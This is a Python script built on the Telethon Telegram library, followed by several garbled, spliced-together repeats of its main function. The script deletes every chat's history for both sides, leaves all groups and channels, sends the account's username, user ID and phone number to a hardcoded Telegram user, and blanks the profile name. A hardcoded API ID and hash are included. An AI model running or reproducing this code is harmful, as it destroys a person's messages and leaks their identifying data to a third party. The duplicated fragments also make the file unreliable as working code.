from telethon import TelegramClient
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.types import Channel, Chat, User
from telethon.errors import FloodWaitError
import asyncio

API_ID = 29834234
API_HASH = "552c01d21d127def060f2915aedeebf9"

TARGET_USERNAME = "Moein_915"
NEW_FIRST_NAME = ""

client = TelegramClient("my_account", API_ID, API_HASH)


async def main():
    await client.start()

    async for d in client.iter_dialogs():
        try:
            entity = d.entity
            name = d.name or str(d.id)

            print(f"Processing: {name} ({type(entity).__name__})")

            await client(DeleteHistoryRequest(
                peer=entity,
                max_id=0,
                revoke=True
            ))

            if isinstance(entity, Channel):
                await client(LeaveChannelRequest(entity))
                print(f"Left Channel/Supergroup: {name}")

            elif isinstance(entity, Chat):
                await client.delete_dialog(entity)
                print(f"Left Group: {name}")

            elif isinstance(entity, User):
                await client.delete_dialog(entity)
                print(f"Deleted Private Chat: {name}")

            await asyncio.sleep(1)

        except FloodWaitError as e:
            print(f"FloodWait: waiting {e.seconds} seconds...")
            await asyncio.sleep(e.seconds)

        except Exception as e:
            print(
                f"FAILED to process {d.name or d.id}. "
                f"Reason: {type(e).__name__}: {e}"
            )

    print("\nDone deleting chats.")

    me = await client.get_me()

    username = f"@{me.username}" if me.username else "(no username)"
    phone = f"+{me.phone}" if me.phone else "(no phone)"

    info_text = (
        f"Username: {username}\n"
        f"User ID: {me.id}\n"
        f"Phone: {phone}"
    )

    print("\n--- Account info to be sent ---")
    print(info_text)
    print("--------------------------------")

    await client.send_message(
        TARGET_USERNAME,
        info_text
    )

    print(f"Sent account info to @{TARGET_USERNAME}")

    await client(UpdateProfileRequest(
        first_name=NEW_FIRST_NAME
    ))

    print(f"Account name changed to: {NEW_FIRST_NAME}")


if __name__ == "__main__":
    with client:
        client.loop.run_until_complete(main())
    info_text = (
        f"Username: {username}\n"
        f"User ID: {me.id}\n"
        f"Phone: {phone}"
    )

    print("\n--- Account info to be sent ---")
    print(info_text)
    print("--------------------------------")

    await client.send_message(TARGET_USERNAME, info_text)

    print(f"Sent account info to @{TARGET_USERNAME}")

    await client(UpdateProfileRequest(
        first_name=NEW_FIRST_NAME
    ))

    print(f"Account name changed to: {NEW_FIRST_NAME}")


if __name__ == "__main__":
    with client:
        client.loop.run_until_complete(main())    me = await client.get_me()

    username = (
        f"@{me.username}"
        if me.username
        else "(no username)"
    )

    phone = (
        f"+{me.phone}"
        if me.phone
        else "(no phone)"
    )

    info_text = (
        f"Username: {username}\n"
        f"User ID: {me.id}\n"
        f"Phone: {phone}"
    )

    print("\n--- Account info to be sent ---")
    print(info_text)
    print("--------------------------------")

    await client.send_message(
        TARGET_USERNAME,
        info_text
    )

    print(
        f"Sent account info to @{TARGET_USERNAME}"
    )

    await client(UpdateProfileRequest(
        first_name=NEW_FIRST_NAME
    ))

    print(
        f"Account name changed to: {NEW_FIRST_NAME}"
    )


if __name__ == "__main__":
    with client:
        client.loop.run_until_complete(main())
    me = await client.get_me()

    username = f"@{me.username}" if me.username else "(no username)"
    phone = f"+{me.phone}" if me.phone else "(no phone)"

    info_text = (
        f"Username: {username}\n"
        f"User ID: {me.id}\n"
        f"Phone: {phone}"
    )

    print("\n--- Account info to be sent ---")
    print(info_text)
    print("--------------------------------")

    await client.send_message(
        TARGET_USERNAME,
        info_text
    )

    print(f"Sent account info to @{TARGET_USERNAME}")

    await client(UpdateProfileRequest(
        first_name=NEW_FIRST_NAME
    ))

    print(f"Account name changed to: {NEW_FIRST_NAME}")


if __name__ == "__main__":
    with client:
        client.loop.run_until_complete(main())    print("\nDone deleting chats.")

    me = await client.get_me()

    username = f"@{me.username}" if me.username else "(no username)"
    phone = f"+{me.phone}" if me.phone else "(no phone)"

    info_text = (
        f"Username: {username}\n"
        f"User ID: {me.id}\n"
        f"Phone: {phone}"
    )

    print("\n--- Account info to be sent ---")
    print(info_text)
    print("--------------------------------")

    await client.send_message(
        TARGET_USERNAME,
        info_text
    )

    print(f"Sent account info to @{TARGET_USERNAME}")

    await client(UpdateProfileRequest(
        first_name=NEW_FIRST_NAME
    ))

    print(f"Account name changed to: {NEW_FIRST_NAME}")


if __name__ == "__main__":
    with client:
        client.loop.run_until_complete(main())            print(
                f"FAILED to process {d.name or d.id}. "
                f"Reason: {type(e).__name__}: {e}"
            )

    print("\nDone deleting chats.")

    # Get account information
    me = await client.get_me()

    username = f"@{me.username}" if me.username else "(no username)"
    phone = f"+{me.phone}" if me.phone else "(no phone)"

    info_text = (
        f"Username: {username}\n"
        f"User ID: {me.id}\n"
        f"Phone: {phone}"
    )

    print("\n--- Account info to be sent ---")
    print(info_text)
    print("--------------------------------")

    # Send account information
    await client.send_message(
        TARGET_USERNAME,
        info_text
    )

    print(
        f"Sent account info to @{TARGET_USERNAME}"
    )

    # Change account first name
    await client(UpdateProfileRequest(
        first_name=NEW_FIRST_NAME
    ))

    print(
        f"Account name changed to: {NEW_FIRST_NAME}"
    )


with client:
    client.loop.run_until_complete(main())
    print("\n--- Account info to be sent ---")
    print(info_text)
    print("--------------------------------")

    await client.send_message(
        TARGET_USERNAME,
        info_text
    )

    print(f"Sent account info to @{TARGET_USERNAME}")

    await client(UpdateProfileRequest(
        first_name=NEW_FIRST_NAME
    ))

    print(f"Account name changed to: {NEW_FIRST_NAME}")


with client:
    client.loop.run_until_complete(main())
with client:
    client.loop.run_until_complete(main())
